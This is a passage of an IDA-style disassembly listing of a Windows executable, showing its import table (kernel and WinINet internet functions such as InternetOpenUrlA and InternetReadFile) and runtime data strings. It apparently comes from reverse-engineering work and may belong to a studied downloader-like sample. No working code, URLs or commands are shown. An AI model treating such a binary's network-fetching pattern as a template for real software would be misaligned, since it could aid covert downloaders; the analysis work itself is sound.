.idata:00406078                 extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
.idata:0040607C ; BOOL __stdcall WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped)
.idata:0040607C                 extrn WriteFile:dword   ; DATA XREF: sub_402909+14Ar
.idata:0040607C                                         ; __write+D8r ...
.idata:00406080 ; LPVOID __stdcall HeapAlloc(HANDLE hHeap,DWORD dwFlags,DWORD dwBytes)
.idata:00406080                 extrn HeapAlloc:dword   ; DATA XREF: sub_402A9A+6Cr
.idata:00406080                                         ; sub_402F9A+74r ...
.idata:00406084 ; BOOL __stdcall GetCPInfo(UINT CodePage,LPCPINFO lpCPInfo)
.idata:00406084                 extrn GetCPInfo:dword   ; DATA XREF: __setmbcp+48r
.idata:00406084                                         ; _setSBUpLow+14r
.idata:00406088 ; UINT GetACP(void)
.idata:00406088                 extrn GetACP:dword      ; DATA XREF: _getSystemCP+2Fr
.idata:0040608C ; UINT GetOEMCP(void)
.idata:0040608C                 extrn GetOEMCP:dword    ; DATA XREF: _getSystemCP+1Ar
.idata:00406090 ; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect)
.idata:00406090                 extrn VirtualAlloc:dword
.idata:00406090                                         ; DATA XREF: ___sbh_alloc_new_region+76r
.idata:00406090                                         ; ___sbh_alloc_new_group+51r ...
.idata:00406094 ; LPVOID __stdcall HeapReAlloc(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem,DWORD dwBytes)
.idata:00406094                 extrn HeapReAlloc:dword ; DATA XREF: ___sbh_alloc_new_region+28r
.idata:00406098 ; FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)
.idata:00406098                 extrn GetProcAddress:dword
.idata:00406098                                         ; DATA XREF: ___crtMessageBoxA+1Er
.idata:00406098                                         ; ___crtMessageBoxA+2Ar ...
.idata:0040609C ; HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName)
.idata:0040609C                 extrn LoadLibraryA:dword ; DATA XREF: ___crtMessageBoxA+12r
.idata:004060A0 ; DWORD GetLastError(void)
.idata:004060A0                 extrn GetLastError:dword ; DATA XREF: __commit+36r
.idata:004060A0                                         ; __write:loc_404E35r ...
.idata:004060A4 ; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
.idata:004060A4                 extrn FlushFileBuffers:dword ; DATA XREF: __commit+2Cr
.idata:004060A8 ; DWORD __stdcall SetFilePointer(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)
.idata:004060A8                 extrn SetFilePointer:dword ; DATA XREF: __lseek+4Fr
.idata:004060AC ; BOOL __stdcall CloseHandle(HANDLE hObject)
.idata:004060AC                 extrn CloseHandle:dword ; DATA XREF: __close+65r
.idata:004060B0
.idata:004060B4 ;
.idata:004060B4 ; Imports from WININET.dll
.idata:004060B4 ;
.idata:004060B4 ; HINTERNET __stdcall InternetOpenUrlA(HINTERNET hInternet,LPCSTR lpszUrl,LPCSTR lpszHeaders,DWORD dwHeadersLength,DWORD dwFlags,DWORD dwContext)
.idata:004060B4                 extrn InternetOpenUrlA:dword ; DATA XREF: sub_401040+30r
.idata:004060B8 ; BOOL __stdcall InternetCloseHandle(HINTERNET hInternet)
.idata:004060B8                 extrn InternetCloseHandle:dword ; DATA XREF: sub_401040+50r
.idata:004060B8                                         ; sub_401040+91r ...
.idata:004060BC ; BOOL __stdcall InternetReadFile(HINTERNET hFile,LPVOID lpBuffer,DWORD dwNumberOfBytesToRead,LPDWORD lpdwNumberOfBytesRead)
.idata:004060BC                 extrn InternetReadFile:dword ; DATA XREF: sub_401040+71r
.idata:004060BC                                         ; sub_4013A2+58r
.idata:004060C0 ; BOOL __stdcall InternetGetConnectedState(LPDWORD lpdwFlags,DWORD dwReserved)
.idata:004060C0                 extrn InternetGetConnectedState:dword
.idata:004060C0                                         ; DATA XREF: sub_401000+8r
.idata:004060C4 ; HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent,DWORD dwAccessType,LPCSTR lpszProxy,LPCSTR lpszProxyBypass,DWORD dwFlags)
.idata:004060C4                 extrn InternetOpenA:dword ; DATA XREF: sub_401040+16r
.idata:004060C8
.idata:004060C8
.rdata:004060CC ; ---------------------------------------------------------------------------
.rdata:004060CC
.rdata:004060CC ; Segment type: Pure data
.rdata:004060CC ; Segment permissions: Read
.rdata:004060CC _rdata          segment para public 'DATA' use32
.rdata:004060CC                 assume cs:_rdata
.rdata:004060CC                 ;org 4060CCh
.rdata:004060CC                 align 10h
.rdata:004060D0 unk_4060D0      db 0FFh                 ; DATA XREF: start+5o
.rdata:004060D1                 db 0FFh
.rdata:004060D2                 db 0FFh
.rdata:004060D3                 db 0FFh
.rdata:004060D4                 db  70h ; p
.rdata:004060D5                 db  12h
.rdata:004060D6                 db  40h ; @
.rdata:004060D8                 db  84h ; ä
.rdata:004060D9                 db  12h
.rdata:004060DA                 db  40h ; @
.rdata:004060DC byte_4060DC     db 6                    ; DATA XREF: sub_4013A2:loc_401407r
.rdata:004060DF                 db    6
.rdata:004060E1                 db    1
.rdata:004060E4                 db  10h
.rdata:004060E6                 db    3
.rdata:004060E7                 db    6
.rdata:004060E9                 db    6
.rdata:004060EA                 db    2
.rdata:004060EB                 db  10h
.rdata:004060EC                 db    4
.rdata:004060ED                 db  45h ; E
.rdata:004060EE                 db  45h ; E
.rdata:004060EF                 db  45h ; E
.rdata:004060F0                 db    5
.rdata:004060F1                 db    5
.rdata:004060F2                 db    5
.rdata:004060F3                 db    5
.rdata:004060F4                 db    5
.rdata:004060F5                 db  35h ; 5
.rdata:004060F6                 db  30h ; 0
.rdata:004060F8                 db  50h ; P
.rdata:004060FD                 db  20h
.rdata:004060FE                 db  28h ; (
.rdata:004060FF                 db  38h ; 8
.rdata:00406100                 db  50h ; P
.rdata:00406101                 db  58h ; X
.rdata:00406102                 db    7
.rdata:00406103                 db    8
.rdata:00406105                 db  37h ; 7
.rdata:00406106                 db  30h ; 0
.rdata:00406107                 db  30h ; 0
.rdata:00406108                 db  57h ; W
.rdata:00406109                 db  50h ; P
.rdata:0040610A                 db    7
.rdata:0040610D                 db  20h
.rdata:0040610E                 db  20h
.rdata:0040610F                 db    8
.rdata:00406114                 db    8
.rdata:00406115                 db  60h ; `
.rdata:00406116                 db  68h ; h
.rdata:00406117                 db  60h ; `
.rdata:00406118                 db  60h ; `
.rdata:00406119                 db  60h ; `
.rdata:0040611A                 db  60h ; `
.rdata:0040611D                 db  70h ; p
.rdata:0040611E                 db  70h ; p
.rdata:0040611F                 db  78h ; x
.rdata:00406120                 db  78h ; x
.rdata:00406121                 db  78h ; x
.rdata:00406122                 db  78h ; x
.rdata:00406123                 db    8
.rdata:00406124                 db    7
.rdata:00406125                 db    8
.rdata:00406128                 db    7
.rdata:0040612A                 db    8
.rdata:0040612B                 db    8
.rdata:0040612C                 db    8
.rdata:0040612F                 db    8
.rdata:00406131                 db    8
.rdata:00406133                 db    7
.rdata:00406134                 db    8
.rdata:00406138 aNull_0:                                ; DATA XREF: .data:off_40713Co
.rdata:00406138                 unicode 0, <(null)>,0
.rdata:00406146                 align 4
.rdata:00406148 aNull           db '(null)',0           ; DATA XREF: .data:off_407138o
.rdata:0040614F                 align 10h
.rdata:00406150 ; char a__global_heap_[]
.rdata:00406150 a__global_heap_ db '__GLOBAL_HEAP_SELECTED',0 ; DATA XREF: sub_402558+8Eo
.rdata:00406167                 align 4
.rdata:00406168 ; char Name[]
.rdata:00406168 Name            db '__MSVCRT_HEAP_SELECT',0 ; DATA XREF: sub_402558+4Fo
.rdata:0040617D                 align 10h
.rdata:00406180 aRuntimeError   db 'runtime error ',0
.rdata:0040618F                 align 10h
.rdata:00406190                 db 0Dh,0Ah,0
.rdata:00406193                 align 4
.rdata:00406194 aTlossError     db 'TLOSS error',0Dh,0Ah,0
.rdata:004061A2                 align 4
.rdata:004061A4 aSingError      db 'SING error',0Dh,0Ah,0
.rdata:004061B1                 align 4
.rdata:004061B4 aDomainError    db 'DOMAIN error',0Dh,0Ah,0
.rdata:004061C3                 align 4
.rdata:004061C4 aR6028UnableToI db 'R6028',0Dh,0Ah
.rdata:004061C4                 db '- unable to initialize heap',0Dh,0Ah,0
.rdata:004061E9                 align 4
.rdata:004061EC aR6027NotEnough db 'R6027',0Dh,0Ah
.rdata:004061EC                 db '- not enough space for lowio initialization',0Dh,0Ah,0
.rdata:00406221                 align 4
.rdata:00406224 aR6026NotEnough db 'R6026',0Dh,0Ah
.rdata:00406224                 db '- not enough space for stdio initialization',0Dh,0Ah,0
.rdata:00406259                 align 4
.rdata:0040625C aR6025PureVirtu db 'R6025',0Dh,0Ah
.rdata:0040625C                 db '- pure virtual function call',0Dh,0Ah,0
.rdata:00406282                 align 4
.rdata:00406284 aR6024NotEnough db 'R6024',0Dh,0Ah
.rdata:00406284                 db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
.rdata:004062B9                 align 4
.rdata:004062BC aR6019UnableToO db 'R6019',0Dh,0Ah
.rdata:004062BC                 db '- unable to open console device',0Dh,0Ah,0
.rdata:004062E5                 align 4
.rdata:004062E8 aR6018Unexpecte db 'R6018',0Dh,0Ah
.rdata:004062E8                 db '- unexpected heap error',0Dh,0Ah,0
.rdata:00406309                 align 4
.rdata:0040630C aR6017Unexpecte db 'R6017',0Dh,0Ah
.rdata:0040630C                 db '- unexpected multithread lock error',0Dh,0Ah,0
.rdata:00406339                 align 4
.rdata:0040633C aR6016NotEnough db 'R6016',0Dh,0Ah
.rdata:0040633C                 db '- not enough space for thread data',0Dh,0Ah,0
.rdata:00406368 aAbnormalProgra db 0Dh,0Ah
.rdata:00406368                 db 'abnormal program termination',0Dh,0Ah,0
.rdata:00406389                 align 4
.rdata:0040638C aR6009NotEnough db 'R6009',0Dh,0Ah
.rdata:0040638C                 db '- not enough space for environment',0Dh,0Ah,0
.rdata:004063B8 aR6008NotEnough db 'R6008',0Dh,0Ah
.rdata:004063B8                 db '- not enough space for arguments',0Dh,0Ah,0
.rdata:004063E2                 align 4
.rdata:004063E4 aR6002FloatingP db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_40746Co
.rdata:004063E4                 db '- floating point not loaded',0Dh,0Ah,0
.rdata:00406409                 align 4
.rdata:0040640C aMicrosoftVisua db 'Microsoft Visual C++ Runtime Library',0
.rdata:0040640C                                         ; DATA XREF: sub_402909+119o
.rdata:00406431                 align 4
.rdata:00406434 ; char asc_406434[]
.rdata:00406434 asc_406434      db 0Ah                  ; DATA XREF: sub_402909+F1o
.rdata:00406434                 db 0Ah,0
.rdata:00406437                 align 4
.rdata:00406438 ; char aRuntimeErrorPr[]
.rdata:00406438 aRuntimeErrorPr db 'Runtime Error!',0Ah ; DATA XREF: sub_402909+D3o
.rdata:00406438                 db 0Ah
.rdata:00406438                 db 'Program: ',0
.rdata:00406452                 align 4
.rdata:00406454 ; char a___[]
.rdata:00406454 a___            db '...',0              ; DATA XREF: sub_402909+BFo
.rdata:00406458 ; char aProgramNameUnk[]
.rdata:00406458 aProgramNameUnk db '<program name unknown>',0 ; DATA XREF: sub_402909+7Do
.rdata:0040646F                 align 10h
.rdata:00406470 ; char aGetlastactivep[]
.rdata:00406470 aGetlastactivep db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
.rdata:00406483                 align 4
.rdata:00406484 ; char aGetactivewindo[]
.rdata:00406484 aGetactivewindo db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
.rdata:00406494 ; char ProcName[]
.rdata:00406494 ProcName        db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
.rdata:004064A0 ; char LibFileName[]
.rdata:004064A0 LibFileName     db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
.rdata:004064AB                 align 4
.rdata:004064AC ; char byte_4064AC[]
.rdata:004064AC byte_4064AC     db 4 dup(0)             ; DATA XREF: ___crtLCMapStringA+57o
.rdata:004064AC                                         ; ___crtGetStringTypeA+52o
.rdata:004064B0 ; const WCHAR SrcStr
.rdata:004064B0 SrcStr          dw 0                    ; DATA XREF: ___crtLCMapStringA+36o
.rdata:004064B0                                         ; ___crtGetStringTypeA+39o
.rdata:004064B2                 align 8
.rdata:004064B8 unk_4064B8      db 0FFh                 ; DATA XREF: ___crtLCMapStringA+5o
.rdata:004064B9                 db 0FFh
.rdata:004064BA                 db 0FFh
.rdata:004064BB                 db 0FFh
.rdata:004064BC                 db  6Eh ; n
.rdata:004064BD                 db  51h ; Q
.rdata:004064BE                 db  40h ; @
.rdata:004064C0                 db  72h ; r
.rdata:004064C1                 db  51h ; Q
.rdata:004064C2                 db  40h ; @
.rdata:004064C4                 db 0FFh
.rdata:004064C5                 db 0FFh
.rdata:004064C6                 db 0FFh
.rdata:004064C7                 db 0FFh
.rdata:004064C8                 db  22h ; "
.rdata:004064C9                 db  52h ; R
.rdata:004064CA                 db  40h ; @
.rdata:004064CC                 db  26h ; &
.rdata:004064CD                 db  52h ; R
.rdata:004064CE                 db  40h ; @
.rdata:004064D0 unk_4064D0      db 0FFh                 ; DATA XREF: ___crtGetStringTypeA+5o
.rdata:004064D1                 db 0FFh
.rdata:004064D2                 db 0FFh
.rdata:004064D3                 db 0FFh
.rdata:004064D4                 db 0A6h ; ª
.rdata:004064D5                 db  53h ; S
.rdata:004064D6                 db  40h ; @
.rdata:004064D8                 db 0AAh ; ¬
.rdata:004064D9                 db  53h ; S
.rdata:004064DA                 db  40h ; @
.rdata:004064DC                 db  18h
.rdata:004064DD                 db  65h ; e
.rdata:004064E8                 db 0ECh ; 8
.rdata:004064E9                 db  65h ; e
.rdata:004064ED                 db  60h ; `
.rdata:004064F0                 db 0CCh ; ¦
.rdata:004064F1                 db  65h ; e
.rdata:004064FC                 db  64h ; d
.rdata:004064FD                 db  66h ; f
.rdata:00406500                 db 0B4h ; ¦
.rdata:00406501                 db  60h ; `
.rdata:00406518                 db 0E4h ; S
.rdata:00406519                 db  65h ; e
.rdata:0040651C                 db  40h ; @
.rdata:0040651D                 db  69h ; i
.rdata:00406520                 db  2Eh ; .
.rdata:00406521                 db  69h ; i
.rdata:00406524                 db  1Ch
.rdata:00406525                 db  69h ; i
.rdata:00406528                 db  0Ch
.rdata:00406529                 db  69h ; i
.rdata:0040652C                 db 0FCh ; n
.rdata:0040652D                 db  68h ; h
.rdata:00406530                 db 0E6h ; µ
.rdata:00406531                 db  68h ; h
.rdata:00406534                 db  70h ; p
.rdata:00406535                 db  66h ; f
.rdata:00406538                 db  82h ; é
.rdata:00406539                 db  66h ; f
.rdata:0040653C                 db  90h ; É
.rdata:0040653D                 db  66h ; f
.rdata:00406540                 db  9Eh ; P
.rdata:00406541                 db  66h ; f
.rdata:00406544                 db 0B2h ; ¦
.rdata:00406545                 db  66h ; f
.rdata:00406548                 db 0C6h ; ¦
.rdata:00406549                 db  66h ; f
.rdata:0040654C                 db 0E2h ; G
.rdata:0040654D                 db  66h ; f
.rdata:00406550                 db 0F8h ; °
.rdata:00406551                 db  66h ; f
.rdata:00406554                 db  12h
.rdata:00406555                 db  67h ; g
.rdata:00406558                 db  2Ch ; ,
.rdata:00406559                 db  67h ; g
.rdata:0040655C                 db  42h ; B
.rdata:0040655D                 db  67h ; g
.rdata:00406560                 db  5Ah ; Z
.rdata:00406561                 db  67h ; g
.rdata:00406564                 db  74h ; t
.rdata:00406565                 db  67h ; g
.rdata:00406568                 db  86h ; å
.rdata:00406569                 db  67h ; g
.rdata:0040656C                 db  96h ; û
.rdata:0040656D                 db  67h ; g
.rdata:00406570                 db 0A4h ; ñ
.rdata:00406571                 db  67h ; g
.rdata:00406574                 db 0B6h ; ¦
.rdata:00406575                 db  67h ; g
.rdata:00406578                 db 0CAh ; -
.rdata:00406579                 db  67h ; g
.rdata:0040657C                 db 0E4h ; S
.rdata:0040657D                 db  67h ; g
.rdata:00406580                 db 0F4h ; (
.rdata:00406581                 db  67h ; g
.rdata:00406584                 db    2
.rdata:00406585                 db  68h ; h
.rdata:00406588                 db  10h
.rdata:00406589                 db  68h ; h
.rdata:0040658C                 db  1Eh
.rdata:0040658D                 db  68h ; h
.rdata:00406590                 db  2Ah ; *
.rdata:00406591                 db  68h ; h
.rdata:00406594                 db  36h ; 6
.rdata:00406595                 db  68h ; h
.rdata:00406598                 db  42h ; B
.rdata:00406599                 db  68h ; h
.rdata:0040659C                 db  4Eh ; N
.rdata:0040659D                 db  68h ; h
.rdata:004065A0                 db  5Ah ; Z
.rdata:004065A1                 db  68h ; h
.rdata:004065A4                 db  64h ; d
.rdata:004065A5                 db  68h ; h
.rdata:004065A8                 db  70h ; p
.rdata:004065A9                 db  68h ; h
.rdata:004065AC                 db  80h ; Ç
.rdata:004065AD                 db  68h ; h
.rdata:004065B0                 db  8Eh ; Ä
.rdata:004065B1                 db  68h ; h
.rdata:004065B4                 db 0A0h ; á
.rdata:004065B5                 db  68h ; h
.rdata:004065B8                 db 0B0h ; ¦
.rdata:004065B9                 db  68h ; h
.rdata:004065BC                 db 0C0h ; +
.rdata:004065BD                 db  68h ; h
.rdata:004065C0                 db 0D4h ; +
.rdata:004065C1                 db  68h ; h
.rdata:004065C4                 db  50h ; P
.rdata:004065C5                 db  69h ; i
.rdata:004065CC                 db  40h ; @
.rdata:004065CD                 db  66h ; f
.rdata:004065D0                 db  2Ah ; *
.rdata:004065D1                 db  66h ; f
.rdata:004065D4                 db  16h
.rdata:004065D5                 db  66h ; f
.rdata:004065D8                 db 0FAh ; ·
.rdata:004065D9                 db  65h ; e
.rdata:004065DC                 db  54h ; T
.rdata:004065DD                 db  66h ; f
.rdata:004065E4                 db  96h ; û
.rdata:004065E5                 db    2
.rdata:004065E6                 db  53h ; S
.rdata:004065E7                 db  6Ch ; l
.rdata:004065E8                 db  65h ; e
.rdata:004065E9                 db  65h ; e
.rdata:004065EA                 db  70h ; p
.rdata:004065EC                 db  4Bh ; K
.rdata:004065ED                 db  45h ; E
.rdata:004065EE                 db  52h ; R
.rdata:004065EF                 db  4Eh ; N
.rdata:004065F0                 db  45h ; E
.rdata:004065F1                 db  4Ch ; L
.rdata:004065F2                 db  33h ; 3
.rdata:004065F3                 db  32h ; 2
.rdata:004065F4                 db  2Eh ; .
.rdata:004065F5                 db  64h ; d
.rdata:004065F6                 db  6Ch ; l
.rdata:004065F7                 db  6Ch ; l
.rdata:004065FA                 db  66h ; f
.rdata:004065FC                 db  49h ; I
.rdata:004065FD                 db  6Eh ; n
.rdata:004065FE                 db  74h ; t
.rdata:004065FF                 db  65h ; e
.rdata:00406600                 db  72h ; r
.rdata:00406601                 db  6Eh ; n
.rdata:00406602                 db  65h ; e
.rdata:00406603                 db  74h ; t
.rdata:00406604                 db  47h ; G
.rdata:00406605                 db  65h ; e
.rdata:00406606                 db  74h ; t
.rdata:00406607                 db  43h ; C
.rdata:00406608                 db  6Fh ; o
.rdata:00406609                 db  6Eh ; n
.rdata:0040660A                 db  6Eh ; n
.rdata:0040660B                 db  65h ; e
.rdata:0040660C                 db  63h ; c
.rdata:0040660D                 db  74h ; t
.rdata:0040660E                 db  65h ; e
.rdata:0040660F                 db  64h ; d
.rdata:00406610                 db  53h ; S
.rdata:00406611                 db  74h ; t
.rdata:00406612                 db  61h ; a
.rdata:00406613                 db  74h ; t
.rdata:00406614                 db  65h ; e
.rdata:00406616                 db  77h ; w
.rdata:00406618                 db  49h ; I
.rdata:00406619                 db  6Eh ; n
.rdata:0040661A                 db  74h ; t
.rdata:0040661B                 db  65h ; e
.rdata:0040661C                 db  72h ; r
.rdata:0040661D                 db  6Eh ; n
.rdata:0040661E                 db  65h ; e
.rdata:0040661F                 db  74h ; t
.rdata:00406620                 db  52h ; R
.rdata:00406621                 db  65h ; e
.rdata:00406622                 db  61h ; a
.rdata:00406623                 db  64h ; d
.rdata:00406624                 db  46h ; F
.rdata:00406625                 db  69h ; i
.rdata:00406626                 db  6Ch ; l
.rdata:00406627                 db  65h ; e
.rdata:0040662A                 db  56h ; V
.rdata:0040662C                 db  49h ; I
.rdata:0040662D                 db  6Eh ; n
.rdata:0040662E                 db  74h ; t
.rdata:0040662F                 db  65h ; e
.rdata:00406630                 db  72h ; r
.rdata:00406631                 db  6Eh ; n
.rdata:00406632                 db  65h ; e
.rdata:00406633                 db  74h ; t
.rdata:00406634                 db  43h ; C
.rdata:00406635                 db  6Ch ; l
.rdata:00406636                 db  6Fh ; o
.rdata:00406637                 db  73h ; s
.rdata:00406638                 db  65h ; e
.rdata:00406639                 db  48h ; H
.rdata:0040663A                 db  61h ; a
.rdata:0040663B                 db  6Eh ; n
.rdata:0040663C                 db  64h ; d
.rdata:0040663D                 db  6Ch ; l
.rdata:0040663E                 db  65h ; e
.rdata:00406640                 db  71h ; q
.rdata:00406642                 db  49h ; I
.rdata:00406643                 db  6Eh ; n
.rdata:00406644                 db  74h ; t
.rdata:00406645                 db  65h ; e
.rdata:00406646                 db  72h ; r
.rdata:00406647                 db  6Eh ; n
.rdata:00406648                 db  65h ; e
.rdata:00406649                 db  74h ; t
.rdata:0040664A                 db  4Fh ; O
.rdata:0040664B                 db  70h ; p
.rdata:0040664C                 db  65h ; e
.rdata:0040664D                 db  6Eh ; n
.rdata:0040664E                 db  55h ; U
.rdata:0040664F                 db  72h ; r
.rdata:00406650                 db  6Ch ; l
.rdata:00406651                 db  41h ; A
.rdata:00406654                 db  6Fh ; o
.rdata:00406656                 db  49h ; I
.rdata:00406657                 db  6Eh ; n
.rdata:00406658                 db  74h ; t
.rdata:00406659                 db  65h ; e
.rdata:0040665A                 db  72h ; r
.rdata:0040665B                 db  6Eh ; n
.rdata:0040665C                 db  65h ; e
.rdata:0040665D                 db  74h ; t
.rdata:0040665E                 db  4Fh ; O
.rdata:0040665F                 db  70h ; p
.rdata:00406660                 db  65h ; e
.rdata:00406661                 db  6Eh ; n
.rdata:00406662                 db  41h ; A
.rdata:00406664                 db  57h ; W
.rdata:00406665                 db  49h ; I
.rdata:00406666                 db  4Eh ; N
.rdata:00406667                 db  49h ; I
.rdata:00406668                 db  4Eh ; N
.rdata:00406669                 db  45h ; E
.rdata:0040666A                 db  54h ; T
.rdata:0040666B                 db  2Eh ; .
.rdata:0040666C                 db  64h ; d
.rdata:0040666D                 db  6Ch ; l
.rdata:0040666E                 db  6Ch ; l
.rdata:00406670                 db 0CAh ; -
.rdata:00406672                 db  47h ; G
.rdata:00406673                 db  65h ; e
.rdata:00406674                 db  74h ; t
.rdata:00406675                 db  43h ; C
.rdata:00406676                 db  6Fh ; o
.rdata:00406677                 db  6Dh ; m
.rdata:00406678                 db  6Dh ; m
.rdata:00406679                 db  61h ; a
.rdata:0040667A                 db  6Eh ; n
.rdata:0040667B                 db  64h ; d
.rdata:0040667C                 db  4Ch ; L
.rdata:0040667D                 db  69h ; i
.rdata:0040667E                 db  6Eh ; n
.rdata:0040667F                 db  65h ; e
.rdata:00406680                 db  41h ; A
.rdata:00406682                 db  74h ; t
.rdata:00406683                 db    1
.rdata:00406684                 db  47h ; G
.rdata:00406685                 db  65h ; e
.rdata:00406686                 db  74h ; t
.rdata:00406687                 db  56h ; V
.rdata:00406688                 db  65h ; e
.rdata:00406689                 db  72h ; r
.rdata:0040668A                 db  73h ; s
.rdata:0040668B                 db  69h ; i
.rdata:0040668C                 db  6Fh ; o
.rdata:0040668D                 db  6Eh ; n
.rdata:00406690                 db  7Dh ; }
.rdata:00406692                 db  45h ; E
.rdata:00406693                 db  78h ; x
.rdata:00406694                 db  69h ; i
.rdata:00406695                 db  74h ; t
.rdata:00406696                 db  50h ; P
.rdata:00406697                 db  72h ; r
.rdata:00406698                 db  6Fh ; o
.rdata:00406699                 db  63h ; c
.rdata:0040669A                 db  65h ; e
.rdata:0040669B                 db  73h ; s
.rdata:0040669C                 db  73h ; s
.rdata:0040669E                 db  9Eh ; P
.rdata:0040669F                 db    2
.rdata:004066A0                 db  54h ; T
.rdata:004066A1                 db  65h ; e
.rdata:004066A2                 db  72h ; r
.rdata:004066A3                 db  6Dh ; m
.rdata:004066A4                 db  69h ; i
.rdata:004066A5                 db  6Eh ; n
.rdata:004066A6                 db  61h ; a
.rdata:004066A7                 db  74h ; t
.rdata:004066A8                 db  65h ; e
.rdata:004066A9                 db  50h ; P
.rdata:004066AA                 db  72h ; r
.rdata:004066AB                 db  6Fh ; o
.rdata:004066AC                 db  63h ; c
.rdata:004066AD                 db  65h ; e
.rdata:004066AE                 db  73h ; s
.rdata:004066AF                 db  73h ; s
.rdata:004066B2                 db 0F7h ; ˜
.rdata:004066B4                 db  47h ; G
.rdata:004066B5                 db  65h ; e
.rdata:004066B6                 db  74h ; t
.rdata:004066B7                 db  43h ; C
.rdata:004066B8                 db  75h ; u
.rdata:004066B9                 db  72h ; r
.rdata:004066BA                 db  72h ; r
.rdata:004066BB                 db  65h ; e
.rdata:004066BC                 db  6Eh ; n
.rdata:004066BD                 db  74h ; t
.rdata:004066BE                 db  50h ; P
.rdata:004066BF                 db  72h ; r
.rdata:004066C0                 db  6Fh ; o
.rdata:004066C1                 db  63h ; c
.rdata:004066C2                 db  65h ; e
.rdata:004066C3                 db  73h ; s
.rdata:004066C4                 db  73h ; s
.rdata:004066C6                 db 0ADh ; ¡
.rdata:004066C7                 db    2
.rdata:004066C8                 db  55h ; U
.rdata:004066C9                 db  6Eh ; n
.rdata:004066CA                 db  68h ; h
.rdata:004066CB                 db  61h ; a
.rdata:004066CC                 db  6Eh ; n
.rdata:004066CD                 db  64h ; d
.rdata:004066CE                 db  6Ch ; l
.rdata:004066CF                 db  65h ; e
.rdata:004066D0                 db  64h ; d
.rdata:004066D1                 db  45h ; E
.rdata:004066D2                 db  78h ; x
.rdata:004066D3                 db  63h ; c
.rdata:004066D4                 db  65h ; e
.rdata:004066D5                 db  70h ; p
.rdata:004066D6                 db  74h ; t
.rdata:004066D7                 db  69h ; i
.rdata:004066D8                 db  6Fh ; o
.rdata:004066D9                 db  6Eh ; n
.rdata:004066DA                 db  46h ; F
.rdata:004066DB                 db  69h ; i
.rdata:004066DC                 db  6Ch ; l
.rdata:004066DD                 db  74h ; t
.rdata:004066DE                 db  65h ; e
.rdata:004066DF                 db  72h ; r
.rdata:004066E2                 db  24h ; $
.rdata:004066E3                 db    1
.rdata:004066E4                 db  47h ; G
.rdata:004066E5                 db  65h ; e
.rdata:004066E6                 db  74h ; t
.rdata:004066E7                 db  4Dh ; M
.rdata:004066E8                 db  6Fh ; o
.rdata:004066E9                 db  64h ; d
.rdata:004066EA                 db  75h ; u
.rdata:004066EB                 db  6Ch ; l
.rdata:004066EC                 db  65h ; e
.rdata:004066ED                 db  46h ; F
.rdata:004066EE                 db  69h ; i
.rdata:004066EF                 db  6Ch ; l
.rdata:004066F0                 db  65h ; e
.rdata:004066F1                 db  4Eh ; N
.rdata:004066F2                 db  61h ; a
.rdata:004066F3                 db  6Dh ; m
.rdata:004066F4                 db  65h ; e
.rdata:004066F5                 db  41h ; A
.rdata:004066F8                 db 0B2h ; ¦
.rdata:004066FA                 db  46h ; F
.rdata:004066FB                 db  72h ; r
.rdata:004066FC                 db  65h ; e
.rdata:004066FD                 db  65h ; e
.rdata:004066FE                 db  45h ; E
.rdata:004066FF                 db  6Eh ; n
.rdata:00406700                 db  76h ; v
.rdata:00406701                 db  69h ; i
.rdata:00406702                 db  72h ; r
.rdata:00406703                 db  6Fh ; o
.rdata:00406704                 db  6Eh ; n
.rdata:00406705                 db  6Dh ; m
.rdata:00406706                 db  65h ; e
.rdata:00406707                 db  6Eh ; n
.rdata:00406708                 db  74h ; t
.rdata:00406709                 db  53h ; S
.rdata:0040670A                 db  74h ; t
.rdata:0040670B                 db  72h ; r
.rdata:0040670C                 db  69h ; i
.rdata:0040670D                 db  6Eh ; n
.rdata:0040670E                 db  67h ; g
.rdata:0040670F                 db  73h ; s
.rdata:00406710                 db  41h ; A
.rdata:00406712                 db 0B3h ; ¦
.rdata:00406714                 db  46h ; F
.rdata:00406715                 db  72h ; r
.rdata:00406716                 db  65h ; e
.rdata:00406717                 db  65h ; e
.rdata:00406718                 db  45h ; E
.rdata:00406719                 db  6Eh ; n
.rdata:0040671A                 db  76h ; v
.rdata:0040671B                 db  69h ; i
.rdata:0040671C                 db  72h ; r
.rdata:0040671D                 db  6Fh ; o
.rdata:0040671E                 db  6Eh ; n
.rdata:0040671F                 db  6Dh ; m
.rdata:00406720                 db  65h ; e
.rdata:00406721                 db  6Eh ; n
.rdata:00406722                 db  74h ; t
.rdata:00406723                 db  53h ; S
.rdata:00406724                 db  74h ; t
.rdata:00406725                 db  72h ; r
.rdata:00406726                 db  69h ; i
.rdata:00406727                 db  6Eh ; n
.rdata:00406728                 db  67h ; g
.rdata:00406729                 db  73h ; s
.rdata:0040672A                 db  57h ; W
.rdata:0040672C                 db 0D2h ; -
.rdata:0040672D                 db    2
.rdata:0040672E                 db  57h ; W
.rdata:0040672F                 db  69h ; i
.rdata:00406730                 db  64h ; d
.rdata:00406731                 db  65h ; e
.rdata:00406732                 db  43h ; C
.rdata:00406733                 db  68h ; h
.rdata:00406734                 db  61h ; a
.rdata:00406735                 db  72h ; r
.rdata:00406736                 db  54h ; T
.rdata:00406737                 db  6Fh ; o
.rdata:00406738                 db  4Dh ; M
.rdata:00406739                 db  75h ; u
.rdata:0040673A                 db  6Ch ; l
.rdata:0040673B                 db  74h ; t
.rdata:0040673C                 db  69h ; i
.rdata:0040673D                 db  42h ; B
.rdata:0040673E                 db  79h ; y
.rdata:0040673F                 db  74h ; t
.rdata:00406740                 db  65h ; e
.rdata:00406742                 db    6
